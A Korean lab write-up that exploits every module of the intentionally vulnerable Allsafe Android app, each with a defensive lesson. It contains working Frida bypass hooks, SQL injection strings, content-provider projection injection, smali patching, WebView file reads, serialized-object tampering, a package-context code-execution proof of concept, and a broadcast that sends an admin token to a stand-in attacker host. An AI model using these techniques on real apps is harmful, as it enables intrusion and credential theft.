---
layout: post
title: "Allsafe - 의도적으로 취약한 안드로이드 앱 정공법 분석"
date: 2026-08-31 09:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, Allsafe, Frida, jadx, apktool, 정적분석, 동적분석, 취약점재현, 학습기록]
excerpt: "Allsafe 는 CTF 스타일 대신 실제 앱처럼 생긴 의도적 취약 앱입니다. 로그 유출·하드코딩 자격증명부터 exported 컴포넌트, ContentProvider SQL 인젝션, WebView 로컬 파일 읽기, 네이티브 라이브러리 역산, DexClassLoader 임의코드 실행, 직렬화 객체 위변조까지 — 모든 모듈을 x86_64 에뮬레이터에서 정적·동적으로 직접 재현하고 화면과 로그로 증거를 남겼습니다. 되는 것과 안 되는 것(scoped storage 로 죽은 벡터, 요금제 정책으로 회수된 백엔드)까지 있는 그대로 적었습니다."
---

> **대상**: [t0thkr1s/allsafe](https://github.com/t0thkr1s/allsafe) — 교육용으로 만들어진 의도적 취약 안드로이드 앱 (v1.6)
> **환경**: Android x86_64 API 33 에뮬레이터, frida 17.17.0, jadx / apktool, Android SDK build-tools (d8·aapt·apksigner)
> **범위**: 내 소유 에뮬레이터 위의 학습용 타깃. 실제 서비스가 아닌 훈련 앱 분석입니다.

Allsafe 는 흔한 CTF 앱과 결이 다릅니다. 화면은 초록색 터미널 테마의 "모바일 침투 테스트 랩"
이지만, 안을 열어 보면 OkHttp·Firebase·RootBeer·JNI 네이티브 같은 **현업에서 실제로 쓰는
라이브러리**로 취약점을 재현해 둡니다. 그래서 "플래그를 찾는" 감각보다 "실제 앱을 감사하는"
감각에 가깝습니다. 이 글은 앱의 모든 취약 모듈을 정적으로 뜯어보고, 에뮬레이터에서 동적으로
직접 익스플로잇하고, **화면·logcat·터미널 출력으로 결과를 확인한 기록**입니다. 잘 된 것뿐 아니라
현대 안드로이드에서 막혀 버린 벡터도 원인과 함께 남겼습니다.

취약점을 성격별로 묶어 설명합니다. 실행 순서와 서술 순서가 다를 수 있지만, 모든 모듈을 다룹니다.

---

## 0. 먼저 부딪힌 벽 (Secure Flag Bypass)

앱을 깔고 `screencap` 을 찍으면 **까만 화면(23KB짜리 빈 PNG)** 만 나옵니다. 원인은 런처
액티비티가 창을 만들 때 스크린샷·화면녹화를 막는 `FLAG_SECURE` 를 거는 것입니다.

```kotlin
// MainActivity.onCreate()
window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE)
```

이걸 먼저 풀지 않으면 이후 어떤 화면도 증거로 남길 수 없습니다. 그런데 이미 만들어진 창에
`clearFlags` 를 호출해도 소용없었습니다 — 이미 secure 로 태어난 표면은 되돌릴 수 없기 때문입니다.
그래서 **앱이 뜨기 전(spawn 시점)에 `setFlags` 자체를 후킹**해서 `FLAG_SECURE`(0x2000) 비트를
벗겨 냈습니다.

```javascript
// bypass_secureflag.js — spawn 시 주입
Java.perform(function () {
    var FLAG_SECURE = 0x2000;
    var Window = Java.use("android.view.Window");
    Window.setFlags.overload('int', 'int').implementation = function (flags, mask) {
        return this.setFlags(flags & ~FLAG_SECURE, mask & ~FLAG_SECURE);
    };
});
```

```
$ frida -U -f infosecadventures.allsafe -l bypass_secureflag.js
[SecureFlagBypass] setFlags(8192,8192) -> stripped FLAG_SECURE -> (0,0)
```

훅이 걸리자마자 같은 `screencap` 이 **까만 23KB → 정상 103KB** 로 바뀌었습니다. 이 한 번의
후킹이 곧 챌린지 "Secure Flag Bypass" 의 정답이면서, 동시에 이후 모든 화면 캡처의 전제 조건이
되었습니다. 아래 홈 화면이 그 첫 증거입니다.

![Frida 로 FLAG_SECURE 를 벗긴 뒤 정상적으로 캡처된 Allsafe 홈 화면 — 이전에는 같은 명령이 검은 화면만 반환했다](/assets/img/allsafe-android/allsafe-home.png)

`FLAG_SECURE` 는 어깨너머 훔쳐보기나 악성 접근성 서비스의 화면 캡처를 늦추는 방어일 뿐,
디바이스를 통제하는 공격자(루팅·Frida) 앞에서는 종이 한 장입니다. 민감 화면을 가리는 UX
보호로는 의미가 있어도, 보안 경계로 신뢰하면 안 된다는 점을 첫 화면부터 보여 줍니다.

전체 취약 모듈 메뉴는 다음과 같습니다.

![Allsafe 의 취약점 모듈 목록 드로어 — Insecure Logging 부터 Native Library 까지](/assets/img/allsafe-android/allsafe-menu.png)

---

## 1. 정보 노출

### 1-1. Insecure Logging

가장 단순한 정보 노출입니다. 입력 필드에 값을 넣고 완료를 누르면 그대로 디버그 로그로 나갑니다.

```java
Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
```

필드에 비밀번호를 입력하고 키보드의 완료(IME_ACTION_DONE)를 누른 뒤 logcat 을 보면:

```
$ adb logcat -d -s ALLSAFE:D
D ALLSAFE : User entered secret: hunter2_MySecretPassword
```

`READ_LOGS` 를 가진 앱이나 ADB 접근이 가능한 상황에서 사용자가 입력한 값이 평문으로 수집됩니다.
릴리스 빌드에서 로그를 제거하지 않으면 인증 응답·토큰·비밀번호가 그대로 새는 전형적인 실수입니다.

![Insecure Logging 화면에 비밀을 입력한 상태 — 같은 값이 logcat 에 평문으로 남는다](/assets/img/allsafe-android/c01-insecure-logging.png)

### 1-2. Hardcoded Credentials

이 모듈의 안내문이 스스로 "이 프래그먼트에 하드코딩된 username:password 조합이 2개 있다"
고 알려 줍니다. 소스가 아니라 **설치된 APK 를 리버싱**해서 찾는 것이 정공법이라, base.apk 를
당겨 dex·리소스를 뒤졌습니다.

```
# SOAP 요청 본문에 박힌 관리자 계정 (classes4.dex)
$ grep -a -oE 'superadmin|supersecurepassword' dex/classes4.dex
superadmin
supersecurepassword

# 개발 서버 URL 에 통째로 박힌 자격증명 (resources.arsc)
$ grep -a -oE 'admin:password123@[a-z.]+' res_extract/resources.arsc
admin:password123@dev.infosecadventures.com
```

하나는 SOAP 헤더의 `superadmin` / `supersecurepassword`, 다른 하나는 `R.string.dev_env` 에
들어 있는 `https://admin:password123@dev.infosecadventures.com` 입니다. 클라이언트에 박힌 비밀은
난독화를 해도 결국 문자열 테이블이나 dex 상수 풀에 남습니다 — "숨긴다"가 아니라 "제거한다"가
정답인 이유입니다.

![Hardcoded Credentials 모듈 화면 — 프래그먼트에 2개의 username:password 가 박혀 있다고 안내한다](/assets/img/allsafe-android/c02-hardcoded-credentials.png)

### 1-3. Insecure Shared Preferences

회원가입 폼에 값을 넣으면 SharedPreferences 에 **암호화 없이** 저장됩니다.

```java
editor.putString("username", username.getText().toString());
editor.putString("password", password.getText().toString());
editor.apply();
```

앱이 디버그 가능(`android:debuggable="true"`)하므로 `run-as` 로 앱의 내부 저장소를 그대로 읽을 수
있습니다. 루팅 기기나 백업에서도 마찬가지입니다.

```xml
$ run-as infosecadventures.allsafe cat .../shared_prefs/user.xml
<map>
    <string name="password">SuperSecret123</string>
    <string name="username">wtcy_admin</string>
</map>
```

민감 정보는 `EncryptedSharedPreferences`(Keystore 기반)로 보호해야 합니다. 평문 prefs 는
디바이스에 접근할 수 있는 누구에게나 열린 파일입니다.

### 1-4. Weak Cryptography

"암호화" 모듈은 세 가지 약점을 한 화면에 모아 놨습니다. 소스만 봐도 키가 박혀 있습니다.

```java
public static final String KEY = "1nf053c4dv3n7ur3";
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
```

**MD5** 해시 버튼으로 `password` 를 해싱하면 무솔트 평문 MD5 라 레인보우 테이블로 즉시 역산됩니다.

```
$ printf 'password' | md5sum
5f4dcc3b5aa765d61d8327deb882cf99   # 같은 다이제스트 (앱은 %032X 포맷이라 대문자로 출력)
```

**AES** 는 더 심각합니다. 키가 코드에 박혀 있으니 누구나 복호할 수 있고, ECB 모드는 같은 평문
블록이 같은 암호 블록으로 나와 패턴이 드러납니다. 박힌 키로 실제 왕복을 돌려 봤습니다.

```
$ KEYHEX=$(printf '1nf053c4dv3n7ur3' | xxd -p)
$ echo -n 'my-deepest-secret' | openssl enc -aes-128-ecb -K $KEYHEX | xxd -p
4ee2daac01dbf6c0c3efefe7458e546da79a2afac1102f106d8b2e9818a3786d
# 같은 키로 복호 → 평문 그대로 복원
my-deepest-secret

# ECB 결함: 동일 평문 블록 2개 → 동일 암호 블록 2개 (패턴 노출)
1289e84a3a15876197024e4dc13c1e42
1289e84a3a15876197024e4dc13c1e42
```

키는 서버나 Keystore 에 두고, 모드는 최소 CBC/GCM 이어야 하며, 비밀번호 저장에는 MD5 가 아니라
bcrypt/scrypt/Argon2 같은 느린 해시를 써야 합니다.

![Weak Cryptography — password 의 MD5 해시(앱은 대문자로 출력). 무솔트 MD5 라 레인보우 테이블로 즉시 역산된다](/assets/img/allsafe-android/c16-weak-crypto.png)

---

## 2. 클라이언트 측 검증

이 부류의 공통점은 "판정을 클라이언트가 한다"는 것입니다. 판정 코드와 데이터가 전부 기기 안에
있으니, 정적으로 값을 캐거나 동적으로 반환을 뒤집으면 끝납니다.

### 2-1. PIN Bypass

`checkPin` 은 입력값을 base64 로 인코딩된 상수와 비교합니다.

```kotlin
return pin == String(android.util.Base64.decode("NDg2Mw==", android.util.Base64.DEFAULT))
```

프리다로 반환을 뒤집을 필요도 없습니다. 상수를 디코드하면 정답이 나옵니다.

```
$ echo NDg2Mw== | base64 -d
4863
```

`4863` 을 입력하면 통과합니다. 4자리 PIN 을 클라이언트에서 검사하는 건 무차별 대입에도, 상수
추출에도 무력합니다.

![PIN Bypass — base64 상수에서 복원한 4863 입력으로 접근 허용](/assets/img/allsafe-android/c15-pin-bypass.png)

### 2-2. Root Detection

루팅 탐지는 RootBeer 라이브러리의 `isRooted()` 한 줄로 이뤄집니다.

```kotlin
if (RootBeer(context).isRooted) { "rooted!" } else { "not detected" }
```

먼저 짚을 점 하나 — **이 깨끗한 에뮬레이터는 RootBeer 가 루팅으로 판정하지 않습니다.** 빌드 태그가
`test-keys` 가 아니라 `dev-keys` 이고, `/system/xbin/su` 는 존재하지만 SELinux 때문에 앱
프로세스(untrusted_app)에서는 `stat` 조차 막혀 보이지 않기 때문입니다. 그래서 아무 조작 없이도
"not detected" 가 나옵니다.

챌린지의 의도(Frida 연습)를 제대로 보이기 위해, `isRooted` 의 반환을 **양방향으로** 조종했습니다.

```javascript
// 탐지 시연: 강제로 true → "Sorry, your device is rooted!"
RootBeer.isRooted.implementation = function () { return true; };
// 우회: 강제로 false → "Congrats, root is not detected!"
```

`true` 로 강제하면 로그에 `RootBeer.isRooted() -> forced TRUE` 가 찍히면서 아래처럼 "루팅됨"
으로 바뀌고, `false` 로 강제하면 다시 "미탐지" 로 돌아옵니다. 즉 판정 자체를 후킹으로 통제할 수
있다는 것을 두 화면으로 보였습니다. 루팅 탐지가 앱 프로세스 안에서 이뤄지는 한, 그 안에 들어온
계측 도구 앞에서는 참·거짓이 공격자의 손에 있습니다.

![Root Detection — Frida 로 isRooted 를 true 로 강제해 "your device is rooted" 를 유도한 탐지 시연](/assets/img/allsafe-android/c03-root-detected.png)

![Root Detection — 같은 판정을 false 로 뒤집어 "root is not detected" 로 우회한 결과](/assets/img/allsafe-android/c03-root-bypassed.png)

### 2-3. Native Library

비밀번호 검증을 네이티브(`libnative_library.so`)로 옮겨 놨습니다. 하지만 검증 로직은 단순 XOR
입니다.

```cpp
string p = "supersecret";        // 컴파일러가 미사용 변수로 최적화해 버림
char k = 'K';
for (...) output[i] = pass[i] ^ k;
return hardcoreEncryption(env, pass) == "8>;.98.(9.?";
```

릴리스 .so 는 스트립돼 있어 평문 "supersecret" 문자열은 남지 않았습니다(위 `p` 는 미사용으로
제거). 대신 목표 암호문과 키가 남아 있으니 손으로 XOR 를 되돌리면 됩니다.

```
$ python -c "print(''.join(chr(ord(c)^0x4B) for c in '8>;.98.(9.?'))"
supersecret
```

앱에 `supersecret` 를 입력하면 통과하고, Frida 로 네이티브 메서드 호출을 계측하면 인자와 반환이
그대로 보입니다.

```
[HOOK] NativeLibrary.checkPassword('supersecret') -> true
```

"네이티브로 옮기면 안전하다"는 오해를 겨냥한 모듈입니다. 로직이 단순하면 아키텍처와 무관하게
정적 역산이나 동적 후킹으로 뚫립니다.

![Native Library — 역산한 supersecret 입력으로 검증 통과, Frida 로그가 반환값 true 를 확인](/assets/img/allsafe-android/c12-native-library.png)

### 2-4. Smali Patch

이 모듈은 방화벽 상태가 하드코딩으로 항상 비활성입니다.

```java
Firewall firewall = Firewall.INACTIVE;   // 항상 INACTIVE → "Firewall is down"
if (firewall.equals(Firewall.ACTIVE)) { ... "good job" ... }
```

apktool 로 디컴파일해 smali 에서 값을 로드하는 한 줄을 바꿉니다.

```smali
- sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->INACTIVE:...
+ sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->ACTIVE:...
```

`apktool b` 로 재빌드하고 `zipalign` → `apksigner`(디버그 키)로 서명한 뒤 재설치했습니다. 원본과
서명이 다르므로 기존 앱을 제거하고 패치본을 설치해야 합니다. 다시 실행해 버튼을 누르면 흐름이
바뀐 것이 보입니다.

![Smali Patch — INACTIVE 를 ACTIVE 로 패치·재서명한 APK 에서 "Firewall is now activated, good job!"](/assets/img/allsafe-android/c11-smali-patch.png)

클라이언트 바이너리는 언제든 수정·재서명될 수 있습니다. 라이선스 체크·기능 게이트·안티치트를
클라이언트 분기 하나에 의존하면 smali 한 줄로 무력화됩니다.

---

## 3. exported 컴포넌트

`AndroidManifest.xml` 에서 `android:exported="true"` 로 열려 있는 컴포넌트는 다른 앱(또는 adb)이
직접 호출할 수 있습니다. Allsafe 는 리시버·서비스·프로바이더·프록시 액티비티를 모두 열어 뒀습니다.

### 3-1. Insecure Broadcast Receiver

`NoteReceiver` 가 exported 이고, 받은 extra 로 URL 을 조립해 요청을 보냅니다. 문제는 **서버 주소를
호출자가 준다**는 점, 그리고 **관리자 토큰이 하드코딩**돼 있다는 점입니다.

```java
.host(server)                                   // 공격자가 지정
.addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=")
```

외부에서 브로드캐스트를 쏘면:

```
$ am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE \
    -n infosecadventures.allsafe/.challenges.NoteReceiver \
    --es server "attacker.wtcy.test" --es note "..." --es notification_message "..."

# NoteReceiver 가 조립한 URL (logcat)
D ALLSAFE : http://attacker.wtcy.test/api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4%3D&note=...

$ echo YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4= | base64 -d
allsafe_dev_admin_token
```

권한 없는 앱이 Allsafe 를 시켜 **하드코딩된 관리자 토큰을 공격자가 지정한 호스트로 전송**하게
만들 수 있습니다(SSRF + 비밀 유출). exported 리시버는 서명 권한으로 보호하거나 내부 전용으로
닫아야 합니다.

### 3-2. Deep Link Exploitation

`DeepLinkTask` 가 `allsafe://infosecadventures/congrats` 스킴을 처리하고, 쿼리 `key` 를
`R.string.key` 와 비교합니다. 그 key 는 리소스에 그대로 있습니다(`ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`).

```
$ am start -a android.intent.action.VIEW \
    -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

정답 key 로 딥링크를 열면 잠긴 화면이 풀립니다.

![Deep Link — 리소스에서 추출한 key 로 딥링크를 열자 "Good job, you did it!"](/assets/img/allsafe-android/c08-deeplink.png)

딥링크로 도달하는 화면이 인증·상태 검증 없이 열리면, 브라우저 링크 한 줄로 내부 기능이
트리거됩니다(딥링크 CSRF).

### 3-3. Insecure Service

`RecorderService` 가 exported 라, 다른 앱이 서비스를 시작하는 것만으로 마이크 녹음이 돌아갑니다.

```
$ am startservice -n infosecadventures.allsafe/.challenges.RecorderService
# 잠시 후
-rw-rw---- ... /sdcard/Download/allsafe_rec_20260831_064235720.mp3
```

녹음 파일이 다운로드 폴더에 생성됩니다. 서비스 내부에 호출자 검증이 없으니, 권한을 이미 가진
호스트 앱을 대리인으로 삼아 **사용자 동의 없는 도청**이 가능합니다. 마이크처럼 민감한 동작을 하는
서비스는 절대 exported 여선 안 됩니다.

### 3-4. Data Provider

`DataProvider` 가 exported 이고, 넘어온 projection/selection 을 그대로 `SQLiteQueryBuilder` 에
꽂습니다.

```java
queryBuilder.setTables("note");
return queryBuilder.query(db, projection, selection, selectionArgs, null, null, sortOrder);
```

권한이 없어도 노트 테이블이 통째로 열립니다.

```
$ content query --uri content://infosecadventures.allsafe.dataprovider/note
Row: 0 user=admin, note=I can not believe that Jill is still using 123456 as her password...
Row: 1 user=elliot.alderson, note=...
```

여기서 끝이 아닙니다. projection 에 SQL 을 주입하면 임의 스키마를 읽습니다.

```
$ content query --uri content://.../note --projection "name FROM sqlite_master WHERE type=\"table\"--"
Row: 0 name=android_metadata
Row: 1 name=note
Row: 2 name=sqlite_sequence
```

인증 없는 데이터 접근과 SQL 인젝션이 겹친 형태입니다. 프로바이더는 권한으로 보호하고,
selection/projection 을 신뢰하지 말고 화이트리스트·파라미터 바인딩으로 다뤄야 합니다.

### 3-5. (보너스) ProxyActivity

메뉴에는 없지만 매니페스트에 exported 로 열린 `ProxyActivity` 가 있습니다.

```java
startActivity(getIntent().getParcelableExtra("extra_intent"));
```

외부가 준 Intent 를 검증 없이 그대로 실행합니다. 공격자가 `extra_intent` 에 내부(비-exported)
컴포넌트를 겨냥한 Intent 를 실어 보내면, **앱 자신의 신원으로** 그 컴포넌트가 열립니다 — 전형적인
혼동된 대리인(confused deputy). 넘겨받은 Intent 는 컴포넌트/액션을 화이트리스트로 검증한 뒤에만
전달해야 합니다.

---

## 4. 주입·파싱

### 4-1. SQL Injection

로그인 쿼리가 입력을 문자열로 이어 붙입니다.

```kotlin
db.rawQuery("select * from user where username = '" + username + "' and password = '" + md5(password) + "'", null)
```

username 에 `'or'1'='1'--` 를 넣으면 비밀번호 조건이 주석 처리되고 조건이 항상 참이 되어 사용자
테이블이 덤프됩니다.

```
입력: username = 'or'1'='1'--   password = (비움)
결과 Toast: User: admin  Pass: 21232f297a57a5a743894a0e4a801fc3
```

덤프된 해시 `21232f29...` 는 "admin" 의 MD5 입니다(앞의 Weak Crypto 와 연결됩니다). 앱 내부
SQLite 라도 웹과 똑같이 파라미터 바인딩(`?`)을 써야 합니다.

![SQL Injection — 'or'1'='1'-- 로 인증을 우회하고 사용자·해시를 덤프한 Toast](/assets/img/allsafe-android/c09-sql-injection.png)

### 4-2. Vulnerable WebView

WebView 가 자바스크립트와 파일 접근을 모두 켜 둡니다.

```java
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);
```

입력이 유효 URL 이 아니면 `loadData`, 유효 URL 이면 `loadUrl` 로 처리하는데, 두 경로 모두 위험
합니다. 첫째, `<script>alert(1337)</script>` 를 넣으면 WebView 안에서 임의 자바스크립트가
실행됩니다. 둘째, `file:///etc/hosts` 를 넣으면 **기기의 로컬 파일이 WebView 에 그대로 렌더**됩니다.

아래 한 장에 두 결과가 같이 담겼습니다 — 위쪽 JavaScript 알림창(1337)은 XSS 실행을, 뒤쪽 텍스트
(`127.0.0.1 localhost` / `::1 ip6-localhost`)는 `file://` 로 읽어 온 `/etc/hosts` 내용입니다.

![Vulnerable WebView — alert(1337) 실행 다이얼로그와, file:// 로 읽어 온 /etc/hosts 내용이 함께 보인다](/assets/img/allsafe-android/c10-webview.png)

파일 접근을 켠 WebView 는 `file://` 로 앱 샌드박스·시스템 파일을 열 수 있습니다. 파일 접근은
끄고(`setAllowFileAccess(false)`), 신뢰 못 할 입력을 WebView 에 절대 로드하지 말아야 합니다.

---

## 5. 백엔드·설정

### 5-1. Firebase Database

Firebase 실시간 DB 에서 `secret` 노드를 읽는 모듈입니다. `google-services.json` 에 DB URL 이
그대로 있습니다(`https://allsafe-8cef0.firebaseio.com`). 규칙이 공개(public read)라면 앱을 거치지
않고 REST 로 바로 읽힙니다.

```
$ curl -s https://allsafe-8cef0.firebaseio.com/.json
{"flag":"5077e90341de49d0ed79b8ee53572dab",
 "secret":"A bug is never just a mistake. It represents something bigger..."}
```

앱은 `secret` 만 보여 주지만, **루트 경로를 읽으면 앱에 노출되지 않은 `flag` 값까지 통째로**
나옵니다. 클라이언트가 특정 노드만 읽는다고 해서 DB 가 그 노드만 준다는 뜻이 아닙니다 — 접근
제어는 Firebase 규칙에서 해야 하고, 규칙이 열려 있으면 전체가 열린 것입니다.

### 5-2. Insecure Providers (Firebase Storage)

이 모듈은 하드코딩된 `gs://allsafe-8cef0.appspot.com/readme.txt` 를 **인증 없이** 내려받습니다.
구조적 취약점은 "공개 스토리지 버킷을 URL 만으로 다운로드"입니다. 그런데 라이브 재현은 막혔습니다.

```
$ curl -s "https://firebasestorage.googleapis.com/v0/b/allsafe-8cef0.appspot.com/o/readme.txt?alt=media"
{"error":{"code":402,"message":"Cloud Storage for Firebase no longer supports ... Spark pricing plan ..."}}
```

버킷이 취약해서가 아니라, **구글이 2024년 9월 무료(Spark) 요금제의 Storage 접근을 회수**했기
때문에 백엔드 자체가 402 를 반환합니다. 코드와 설정(gs URL·api_key)으로 취약 구조는 그대로
확인되지만, 정책 변경으로 실제 다운로드는 불가능합니다. 되는 척하지 않고 있는 그대로 남깁니다.

---

## 6. 코드 로딩

### 6-1. Arbitrary Code Execution

`Application.onCreate` 에 두 개의 코드 로딩 경로가 있습니다.

```kotlin
// (A) 설치된 앱 중 패키지가 "infosecadventures.allsafe" 로 시작하면
//     그 앱의 컨텍스트를 코드 포함으로 만들어 Loader.loadPlugin() 호출
createPackageContext(pkg, CONTEXT_INCLUDE_CODE or CONTEXT_IGNORE_SECURITY)
    .classLoader.loadClass("infosecadventures.allsafe.plugin.Loader")
    .getMethod("loadPlugin").invoke(null)

// (B) /sdcard/Download/allsafe_updater.apk 를 DexClassLoader 로 로드
```

**(B) 벡터는 현대 안드로이드에서 죽었습니다.** 앱의 `targetSdk` 가 35라 scoped storage 가 강제되고,
`requestLegacyExternalStorage` 는 무시됩니다. 그래서 앱이 자기가 만들지 않은
`/sdcard/Download/allsafe_updater.apk` 를 읽으려 하면 `Permission denied` 로 막혀 로딩 자체가
일어나지 않습니다. 이 벡터는 API 29 이하에서나 유효합니다.

**(A) 벡터는 저장소와 무관하게 살아 있습니다.** 패키지명이 `infosecadventures.allsafe.` 로 시작하는
악성 앱을 만들고, 그 안에 `infosecadventures.allsafe.plugin.Loader.loadPlugin()` 을 심으면,
Allsafe 가 시작될 때 **그 코드를 자기 프로세스로 끌어와 실행**합니다. 이것이 오버시큐어드가 정리한
"서드파티 패키지 컨텍스트를 통한 임의코드 실행" 기법입니다.

PoC 앱(`infosecadventures.allsafe.poc`)의 `loadPlugin()` 이 Allsafe 의 Application 컨텍스트를
리플렉션으로 얻어, **호스트의 프라이빗 내부 저장소**에 파일을 쓰게 했습니다 — 그 UID 로만 가능한
동작입니다.

```
# Allsafe 재시작 후 logcat
D ALLSAFE : [ACE-PLUGIN] loadPlugin() executing inside host! uid=10181
D ALLSAFE : [ACE-PLUGIN] wrote proof into host storage: /data/user/0/infosecadventures.allsafe/files/pwned_by_wtcy.txt

# 호스트 프라이빗 저장소에 심긴 증거
$ run-as infosecadventures.allsafe cat .../files/pwned_by_wtcy.txt
ACE via createPackageContext(CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)
attacker=infosecadventures.allsafe.poc  host_pkg=infosecadventures.allsafe  uid=10181
```

내 별도 앱의 코드가 **Allsafe 의 UID(10181)·프로세스·프라이빗 저장소**에서 실행됐습니다. 다른 앱의
컨텍스트를 `CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY` 로 만들어 그 코드를 부르는 것은,
공격자에게 자기 프로세스를 통째로 내주는 것과 같습니다. 신뢰할 수 없는 출처의 dex/context 는
절대 로드해선 안 됩니다.

![Arbitrary Code Execution 모듈 화면 — 실제 임의코드 실행 증거는 logcat 과 호스트 저장소의 증거 파일로 확인했다](/assets/img/allsafe-android/c04-ace.png)

### 6-2. Object Serialization

사용자 객체를 **외부 저장소**에 자바 직렬화로 저장하고, 불러올 때 `role` 필드로 권한을 판정합니다.

```java
// 저장 위치: getExternalFilesDir()/user.dat, 기본 role = "ROLE_AUTHOR"
if (!user.role.equals("ROLE_EDITOR")) { "only editors" } else { "Good job!" }
```

외부 저장소의 직렬화 파일은 손댈 수 있습니다. `ROLE_AUTHOR` 와 `ROLE_EDITOR` 는 둘 다 11바이트라
직렬화 스트림의 길이 프리픽스를 건드리지 않고 **제자리 바이트 패치**만으로 권한을 올릴 수 있습니다.

한 가지 함정이 있었습니다 — `adb push` 로 덮으면 파일 소유자가 바뀌어 앱이 못 읽습니다(EACCES,
scoped storage/FUSE). 그래서 파일을 재생성하지 않고 **root `dd` 로 오프셋 153의 11바이트만 제자리
덮어써서** 소유권을 보존했습니다.

```
$ su 0 sh -c "printf 'ROLE_EDITOR' | dd of=.../user.dat bs=1 seek=153 conv=notrunc"
# 불러오기 결과
Toast: User{username='wtcy', password='pw123', role='ROLE_EDITOR'}
```

역직렬화 입력을 검증 없이 신뢰하면 권한 상승은 물론(신뢰할 수 없는 클래스면) 코드 실행까지
이어질 수 있습니다. 민감 상태는 외부 저장소에 두지 말고, 역직렬화 시 무결성 검증과 화이트리스트가
필요합니다.

![Object Serialization — user.dat 의 role 을 ROLE_EDITOR 로 제자리 패치하자 "Good job!" 과 역직렬화된 객체가 그대로 표시된다](/assets/img/allsafe-android/c18-object-serialization.png)

---

## 7. 인증서 피닝

Certificate Pinning 모듈은 OkHttp `CertificatePinner` 로 `httpbin.io` 를 피닝합니다. 흥미롭게도
구현이 **자가 치유**형입니다 — 먼저 일부러 틀린 핀으로 요청해 예외 메시지에서 실제 서버 핀 해시를
파싱한 뒤, 그 해시로 다시 피닝합니다. 그래서 앱은 정상 상황에서 항상 연결에 성공합니다.

```
D ALLSAFE : sha256/G+QSw0qJuwUD7UqjInOR+MY5s8BVHgu1BuxjH6UvFx8=   # 실서버 핀을 스스로 재유도
Snackbar: Successful connection over HTTPS!
```

Frida 로 `CertificatePinner.check` / `check$okhttp` 를 무력화하는 훅을 넣어 두었지만, 여기서
정직하게 선을 긋겠습니다. **피닝 우회의 실제 목적은 가로채기 프록시(Burp/mitmproxy)의 CA 를
앱이 받아들이게 만드는 것**입니다. 프록시를 세우지 않은 이 환경에서는 "핀 검증을 건너뛰게
만들었다"까지는 계측으로 보였지만, 클리어텍스트 트래픽을 실제로 가로채 보여 주는 단계는 프록시
+ CA 설치가 필요합니다. 릴리스 R8 빌드라 내부 핀검증 호출 경로가 훅 시그니처와 어긋나는 부분도
있어, 이 모듈은 "분석 + 기법 + 연결 성공 확인"까지로 남기고, 트래픽 가로채기는 프록시 셋업을
전제로 별도 검증할 지점으로 표시합니다.

![Certificate Pinning — 자가 치유 피너가 실서버 핀을 재유도해 HTTPS 연결에 성공한다](/assets/img/allsafe-android/c06-certificate-pinning.png)

---

## 마치며

Allsafe 를 관통하는 교훈은 하나로 모입니다. **기기 안에 있는 것은 무엇도 비밀이 아니고, 밖에서
들어오는 것은 무엇도 신뢰할 수 없다.** 로그·prefs·리소스·dex·네이티브 문자열은 전부 추출되고,
클라이언트 판정(PIN·루트·네이티브·방화벽)은 정적 추출이나 동적 후킹으로 뒤집히며, exported
컴포넌트와 검증 없는 입력(SQL·WebView·직렬화·패키지 컨텍스트)은 곧장 공격 표면이 됩니다.

동시에 "되는 것과 안 되는 것"의 경계도 분명했습니다. scoped storage 는 `/sdcard` 기반 dex 로딩
벡터를 실제로 죽였고, 요금제 정책 변경은 Firebase Storage 백엔드를 회수했으며, RootBeer 는 깨끗한
AVD 를 루팅으로 판정하지 않았습니다. 취약점은 코드에 그대로 있어도, 플랫폼과 환경이 도달성을
바꿉니다 — 그래서 "코드에 있다"와 "지금 이 기기에서 익스플로잇된다"를 구분해서 적는 것이
중요합니다.

방어 측 정리도 같은 축입니다. 비밀은 서버·Keystore 로, 판정은 서버로, 컴포넌트는 기본 닫힘으로,
입력은 파라미터 바인딩·화이트리스트로, 그리고 신뢰할 수 없는 코드/데이터/컨텍스트는 로드하지
않기. 하나하나는 교과서 같지만, 이 앱은 그 교과서를 어겼을 때 실제로 무슨 일이 일어나는지를
화면과 로그로 보여 줍니다.
